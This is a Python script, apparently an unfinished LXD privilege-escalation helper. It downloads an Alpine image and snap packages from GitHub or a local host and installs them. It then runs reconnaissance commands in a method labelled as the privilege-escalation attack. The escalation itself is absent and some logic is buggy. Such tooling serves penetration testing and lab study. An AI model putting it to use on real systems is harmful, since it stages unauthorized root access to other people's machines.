#!/usr/bin/python

import  requests
import  os
import  sys
import  zipfile
import  subprocess
import  tempfile
import  shutil


class LXD_Helper:
        def __init__(self):

            #self.DownloadFileZip()
            #self.Set_LXD()
            self.Attack_Prev_sec() 
        def DownloadFileZip(self):
            try:
                url = "https://github.com/jac11/LXD_Helper/raw/refs/heads/main/alpine-v3.13-x86_64-20210218_0139.tar.gz"
                response = requests.get(url, stream=True)
                if os.path.exists('/tmp/alpine'):
                    pass
                else:   
                    os.mkdir('/tmp/alpine')
                with open('/tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz','wb') as downloadzip:
                    for chunk in response.iter_content(chunk_size=10 * 1024):
                        Image = downloadzip.write(chunk)   
                print('[+] INFO ........| download Done /tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz')
            except Exception:
                print('[+] Offline start ....')
                urls = ["http://192.168.56.1/alpine-v3.13-x86_64-20210218_0139.tar.gz",
                        "http://192.168.56.1/core_17272.assert",
                        "http://192.168.56.1/core_17272.snap",
                        "http://192.168.56.1/lxd_36971.assert",
                        "http://192.168.56.1/lxd_36971.snap"           
                    ]
                for url in urls:
                    response = requests.get(url, stream=True)
                    if os.path.exists('/tmp/alpine'):
                        pass
                    else:   
                        os.mkdir('/tmp/alpine')
                        if 'lxd-offline.zip'  not in url :  
                            with open(f'/tmp/alpine/{str(url.split("/")[-1])}',"wb") as downloadzip:
                                for lxd in response.iter_content(chunk_size=10 * 1024):
                                    Image = downloadzip.write(lxd)  
                        else:
                            with open('/tmp/alpine/alpine-v3.13-x86_64-20210218_0139.tar.gz','wb') as downloadzip:
                                for chunk in response.iter_content(chunk_size=10 * 1024):
                                    Image = downloadzip.write(chunk)           
                print('[+] INFO ........| download Done lxd required file')
                print('[+] INFO ........| download Done Image alpine-v3.13-x86_64-20210218_0139.tar.gz') 
       

        def Set_LXD(self):
            try:
                print("Extracting...")
              # Alternative with shell=True (less secure)
                subprocess.run('snap ack     /tmp/alpine/core_17272.assert', shell=True)
                subprocess.run('snap install /tmp/alpine/core_17272.snap', shell=True)
                subprocess.run('snap ack     /tmp/alpine/lxd_36971.assert', shell=True)
                subprocess.run('snap install /tmp/alpine/lxd_36971.snap', shell=True)
                print('done')
                
            except Exception as e:
                print(f"Error in Set_LXD: {e}")
        def Attack_Prev_sec(self):
            print('[+] INFO ........| Start Prive_sec')
            commands = [
                    "id",
                    "groups",
                    "which lxc",
                    "lxc --version",
                  
                ]        
            for oder in commands :
                  subprocess.run(oder)
                 
                        
if __name__ =='__main__':
   LXD_Helper()   
